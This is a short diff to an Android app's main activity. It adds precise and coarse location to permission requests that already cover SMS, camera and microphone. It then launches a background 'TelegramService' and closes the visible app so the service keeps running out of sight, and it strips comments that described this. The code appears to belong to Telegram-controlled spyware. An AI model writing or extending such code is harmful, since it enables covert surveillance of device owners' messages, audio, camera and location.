@@ -26,6 +26,8 @@ public class MainActivity extends Activity {
         perms.add(Manifest.permission.READ_SMS);
         perms.add(Manifest.permission.CAMERA);
         perms.add(Manifest.permission.RECORD_AUDIO);
+        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS);
         }
@@ -38,13 +40,9 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
-        // Kan-tsennaw chwiya w mn be3d kan-ch3lo l'service
         new Handler().postDelayed(() -> {
             try {
-                // Start Telegram Bot Background Service
                 startForegroundService(new Intent(this, TelegramService.class));
-                
-                // Sed l'app (kat-bqa f background)
                 finishAffinity();
             } catch (Exception e) {
                 e.printStackTrace();
